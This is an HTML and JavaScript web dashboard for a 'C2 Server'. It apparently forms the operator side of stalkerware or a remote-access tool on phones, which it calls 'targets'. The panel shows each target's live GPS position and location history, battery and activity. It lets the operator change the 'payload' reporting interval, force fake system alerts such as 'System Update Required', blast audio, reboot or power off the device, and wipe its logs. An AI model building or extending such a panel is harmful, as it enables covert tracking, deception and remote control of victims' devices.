<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anasio | Command & Control</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin=""/>
    <meta name="theme-color" content="#ffffff">
    <style>
        .battery { width: 140px; height: 26px; border-radius: 6px; border: 2px solid #e5e7eb; position: relative; background: #fff; }
        .battery-level { height: 100%; border-radius: 4px; transition: width 400ms ease, background 400ms ease; }
        .battery-tip { position: absolute; right: -8px; top: 5px; width: 5px; height: 12px; background: #e5e7eb; border-radius: 2px; }
        #map { height: 400px; border-radius: 1rem; z-index: 10; }
    </style>
</head>
<body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
    <div class="max-w-6xl mx-auto py-8 px-4 sm:px-6">
        <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200">
            <div class="flex items-center gap-4 mb-4 md:mb-0">
                <div class="bg-blue-600 text-white p-2 rounded-lg">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg>
                </div>
                <div>
                    <h1 class="text-xl font-bold tracking-tight text-gray-900">Anasio C2 Server</h1>
                    <p class="text-xs text-gray-500 font-medium">Encrypted Telemetry Stream</p>
                </div>
            </div>
            <div class="flex items-center gap-6">
                <a href="/history_view" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">Location History</a>
                <div class="flex items-center gap-2 bg-gray-50 px-3 py-2 rounded-xl border border-gray-200">
                    <label class="text-xs font-bold text-gray-500 uppercase">Target:</label>
                    <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
                        <option value="">Awaiting connection...</option>
                    </select>
                </div>
                <div class="flex items-center bg-gray-50 px-4 py-2 rounded-xl border border-gray-200">
                    <span id="dot" class="h-2 w-2 bg-gray-300 rounded-full mr-2 shadow-sm"></span>
                    <span id="status-text" class="text-xs font-bold tracking-wide text-gray-500 uppercase">Offline</span>
                </div>
                <button type="button" id="delete-device-btn" class="text-[11px] font-bold bg-gray-800 text-white px-3 py-2 rounded-xl hover:bg-gray-700 transition shadow-sm uppercase tracking-wide">Delete Target</button>
                <a href="/logout" class="text-xs font-bold bg-red-50 text-red-600 px-4 py-2 rounded-xl hover:bg-red-100 transition">Logout</a>
            </div>
        </nav>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div class="flex flex-col gap-6 lg:col-span-1">
                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
                    <div class="flex items-center justify-between mb-6">
                        <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Battery Status</p>
                        <div class="battery">
                            <div id="battery-fill" class="battery-level" style="width:0%"></div>
                            <div class="battery-tip"></div>
                        </div>
                    </div>
                    <div class="text-center md:text-left">
                        <p id="level-text" class="text-6xl font-black text-gray-800 tracking-tighter">--%</p>
                        <p class="text-sm text-gray-500 mt-2 font-medium">Last Ping: <span id="timestamp" class="font-mono bg-gray-100 px-1.5 py-0.5 rounded text-gray-700">--:--:--</span></p>
                    </div>
                </div>

                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Target Activity</p>
                    <div class="flex items-center gap-4">
                        <div class="bg-blue-50 p-3 rounded-full">
                            <svg class="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                        </div>
                        <div>
                            <p id="activity-text" class="text-lg font-bold text-gray-800">Analyzing...</p>
                            <p id="coords-text" class="text-xs font-mono text-gray-500 mt-1">Acquiring GPS Lock</p>
                        </div>
                    </div>
                </div>

                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Payload Configuration</p>
                    <form id="interval-form" class="flex flex-col gap-3">
                        <label class="text-xs font-medium text-gray-600">Reporting Frequency</label>
                        <select id="interval-select" class="px-3 py-2.5 border border-gray-200 rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-500 outline-none w-full cursor-pointer">
                            <option value="5">Every 5 Seconds</option>
                            <option value="60">Every 1 Minute</option>
                            <option value="600">Every 10 Minutes</option>
                        </select>
                        <button type="submit" class="w-full bg-gray-900 hover:bg-black text-white font-bold px-4 py-2.5 rounded-xl transition shadow-sm text-sm">Deploy Config</button>
                    </form>
                </div>

                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
                    <div class="flex items-center justify-between mb-4">
                        <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">System Alert Override</p>
                        <span id="notif-badge" class="bg-gray-100 text-gray-500 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider">Inactive</span>
                    </div>
                    <form id="notif-form" class="flex flex-col gap-3">
                        <input type="text" id="notif-message" placeholder="e.g. System Update Required..." class="px-3 py-2.5 border border-gray-200 rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-500 outline-none w-full" />
                        <div class="flex gap-2">
                            <button type="submit" class="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Force Show</button>
                            <button type="button" id="hide-notif-btn" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Revoke</button>
                        </div>
                    </form>
                </div>

                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
                    <div class="flex items-center justify-between mb-4">
                        <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Audio Blast</p>
                        <span id="audio-badge" class="bg-gray-100 text-gray-500 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider">Inactive</span>
                    </div>
                    <div class="flex gap-2">
                        <button type="button" id="play-audio-btn" class="flex-1 bg-purple-600 hover:bg-purple-700 text-white font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Blast Audio</button>
                        <button type="button" id="stop-audio-btn" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Cancel</button>
                    </div>
                </div>

                <div class="bg-white rounded-3xl p-6 shadow-sm border border-red-200 bg-red-50/30">
                    <div class="flex items-center justify-between mb-4">
                        <p class="text-xs font-bold text-red-400 uppercase tracking-widest">Danger Zone (Power)</p>
                    </div>
                    <div class="flex gap-2">
                        <button type="button" id="reboot-btn" class="flex-1 bg-orange-600 hover:bg-orange-700 text-white font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Reboot</button>
                        <button type="button" id="shutdown-btn" class="flex-1 bg-black hover:bg-gray-900 text-white font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Power Off</button>
                    </div>
                </div>
            </div>

            <div class="bg-white rounded-3xl p-2 shadow-sm border border-gray-200 lg:col-span-2 relative overflow-hidden flex flex-col">
                <div class="absolute top-4 right-4 z-[400] bg-white rounded-lg shadow px-2 py-1 border border-gray-200 text-xs font-bold text-gray-700">
                    Path:
                    <select id="path-time-filter" class="bg-transparent outline-none cursor-pointer ml-1">
                        <option value="0.5">Last 30 Mins</option>
                        <option value="1">Last 1 Hour</option>
                        <option value="10">Last 10 Hours</option>
                        <option value="0" selected>All Time</option>
                    </select>
                </div>
                <div id="map" class="w-full flex-grow z-0"></div>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
    <script>
        const levelText = document.getElementById('level-text');
        const batteryFill = document.getElementById('battery-fill');
        const timestampEl = document.getElementById('timestamp');
        const statusDot = document.getElementById('dot');
        const statusText = document.getElementById('status-text');
        const coordsText = document.getElementById('coords-text');
        const activityText = document.getElementById('activity-text');
        const selectEl = document.getElementById('device-select');
        const notifBadge = document.getElementById('notif-badge');
        const audioBadge = document.getElementById('audio-badge');

        const map = L.map('map', {zoomControl: false}).setView([0, 0], 2);
        L.control.zoom({ position: 'bottomright' }).addTo(map);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png').addTo(map);

        const customIcon = L.divIcon({
            className: 'custom-icon',
            html: `<div class="bg-blue-600 rounded-full w-4 h-4 shadow-lg border-2 border-white"></div>`,
            iconSize: [24, 24], iconAnchor: [12, 12]
        });

        let marker = L.marker([0, 0], {icon: customIcon}).addTo(map);
        let pathLine = L.polyline([], {color: '#ef4444', weight: 3, opacity: 0.8}).addTo(map);
        let hasLocation = false;
        let localPathHash = "";

        async function fetchAvailableDevices() {
            try {
                const devRes = await fetch('/devices');
                if(!devRes.ok) return;
                const devData = await devRes.json();
                const currentSelected = selectEl.value;
                if (devData.devices && devData.devices.length > 0) {
                    if (selectEl.options.length > 0 && selectEl.options[0].value === "") { selectEl.innerHTML = ''; }
                    devData.devices.forEach(did => {
                        if (!Array.from(selectEl.options).some(opt => opt.value === did)) {
                            const opt = document.createElement('option');
                            opt.value = did; opt.textContent = did;
                            selectEl.appendChild(opt);
                        }
                    });
                    if (!currentSelected && selectEl.options.length > 0) { selectEl.value = selectEl.options[0].value; }
                }
            } catch(err) { console.error(err); }
        }

        async function fetchStats(){
            await fetchAvailableDevices();
            const activeDevice = selectEl.value;
            if(!activeDevice) return;

            try {
                const res = await fetch(`/stats?device_id=${encodeURIComponent(activeDevice)}`);
                const data = await res.json();
                
                if(data.level && data.timestamp !== "Waiting for devices...") {
                    const n = parseInt(data.level || 0, 10);
                    levelText.textContent = n + '%';
                    batteryFill.style.width = n + '%';
                    batteryFill.style.background = n >= 50 ? '#16a34a' : (n >= 20 ? '#f59e0b' : '#dc2626');
                    
                    if (data.unix_time) {
                        const d = new Date(data.unix_time * 1000);
                        timestampEl.textContent = d.toLocaleString();
                    } else {
                        timestampEl.textContent = data.timestamp;
                    }
                    
                    activityText.textContent = data.activity || 'Stationary';
                    
                    if (data.is_online) {
                        statusDot.className = "h-2 w-2 bg-green-500 rounded-full mr-2 animate-pulse";
                        statusText.textContent = 'Online';
                    } else {
                        statusDot.className = "h-2 w-2 bg-gray-400 rounded-full mr-2";
                        statusText.textContent = 'Offline';
                    }

                    // Update notification badge
                    if (data.notif_state === 1) {
                        notifBadge.textContent = 'Active';
                        notifBadge.className = 'bg-red-100 text-red-600 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider';
                    } else {
                        notifBadge.textContent = 'Inactive';
                        notifBadge.className = 'bg-gray-100 text-gray-500 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider';
                    }

                    // Update audio badge
                    if (data.play_audio === 1) {
                        audioBadge.textContent = 'Blasting';
                        audioBadge.className = 'bg-purple-100 text-purple-600 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider animate-pulse';
                    } else {
                        audioBadge.textContent = 'Inactive';
                        audioBadge.className = 'bg-gray-100 text-gray-500 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider';
                    }

                    // Sync the interval dropdown with actual device config
                    const intervalSelect = document.getElementById('interval-select');
                    if (data.ping_interval && document.activeElement !== intervalSelect) {
                        // Create option if it doesn't exist (e.g. custom interval)
                        if (!Array.from(intervalSelect.options).some(opt => opt.value === data.ping_interval.toString())) {
                            const newOpt = document.createElement('option');
                            newOpt.value = data.ping_interval.toString();
                            newOpt.textContent = `Every ${data.ping_interval} Seconds`;
                            intervalSelect.appendChild(newOpt);
                        }
                        intervalSelect.value = data.ping_interval.toString();
                    }

                    if(data.lat && data.lon) {
                        const lat = parseFloat(data.lat);
                        const lon = parseFloat(data.lon);
                        const newLatLng = new L.LatLng(lat, lon);
                        marker.setLatLng(newLatLng);
                        
                        const timeFilter = document.getElementById('path-time-filter').value;
                        const incomingHash = `${lat}_${lon}_${data.timestamp}_${timeFilter}`;
                        if(incomingHash !== localPathHash) {
                            localPathHash = incomingHash;
                            const histRes = await fetch(`/history?device_id=${encodeURIComponent(activeDevice)}&hours=${timeFilter}`);
                            if(histRes.ok) {
                                const histData = await histRes.json();
                                if(histData.path) pathLine.setLatLngs(histData.path);
                            }
                        }
                        if(!hasLocation) { map.flyTo(newLatLng, 15); hasLocation = true; }
                        coordsText.textContent = `${lat.toFixed(5)}°, ${lon.toFixed(5)}°`;
                    }
                }
            } catch(e) { console.error(e); }
        }

        (async () => { await fetchStats(); setInterval(fetchStats, 5000); })();
        selectEl.addEventListener('change', () => { hasLocation = false; localPathHash = ""; fetchStats(); });
        document.getElementById('path-time-filter').addEventListener('change', () => { localPathHash = ""; fetchStats(); });

        document.getElementById('interval-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const val = document.getElementById('interval-select').value;
            const fd = new FormData();
            fd.append('device_id', selectEl.value);
            fd.append('interval', val);
            await fetch('/set_interval', { method: 'POST', body: fd });
            alert("Config Sent");
        });

        async function setNotificationCmd(state, text) {
            if(!selectEl.value) { alert('No device selected'); return; }
            const fd = new FormData();
            fd.append('device_id', selectEl.value);
            fd.append('state', state);
            fd.append('text', text);
            const res = await fetch('/set_notification', { method: 'POST', body: fd });
            if(res.ok) { fetchStats(); } else { alert('Failed to send notification command'); }
        }
        document.getElementById('notif-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const msg = document.getElementById('notif-message').value;
            if(!msg.trim()) { alert('Enter a notification message'); return; }
            setNotificationCmd(1, msg);
        });
        document.getElementById('hide-notif-btn').addEventListener('click', () => { setNotificationCmd(0, ""); });

        async function setAudioCmd(play) {
            if(!selectEl.value) { alert('No device selected'); return; }
            const fd = new FormData();
            fd.append('device_id', selectEl.value);
            fd.append('play_audio', play);
            const res = await fetch('/set_audio', { method: 'POST', body: fd });
            if(res.ok) { fetchStats(); } else { alert('Failed to send audio command'); }
        }
        document.getElementById('play-audio-btn').addEventListener('click', () => setAudioCmd(1));
        document.getElementById('stop-audio-btn').addEventListener('click', () => setAudioCmd(0));

        async function setPowerCmd(action) {
            if(!selectEl.value) { alert('No device selected'); return; }
            if(action === 'shutdown' && !confirm("WARNING: If you power off the device remotely, you will lose connection permanently until the device is turned back on manually. Proceed?")) return;
            if(action === 'reboot' && !confirm("Are you sure you want to reboot the target device?")) return;
            
            const fd = new FormData();
            fd.append('device_id', selectEl.value);
            fd.append('action', action);
            const res = await fetch('/set_power_cmd', { method: 'POST', body: fd });
            if(res.ok) { 
                alert(action.toUpperCase() + ' command sent! Connection will drop momentarily.'); 
            } else { 
                alert('Failed to send power command'); 
            }
        }
        document.getElementById('reboot-btn').addEventListener('click', () => setPowerCmd('reboot'));
        document.getElementById('shutdown-btn').addEventListener('click', () => setPowerCmd('shutdown'));

        document.getElementById('delete-device-btn').addEventListener('click', async () => {
            if(!confirm("Wipe this device's logs?")) return;
            const fd = new FormData();
            fd.append('device_id', selectEl.value);
            await fetch('/delete_device', { method: 'POST', body: fd });
            window.location.reload();
        });
    </script>
</body>
</html>
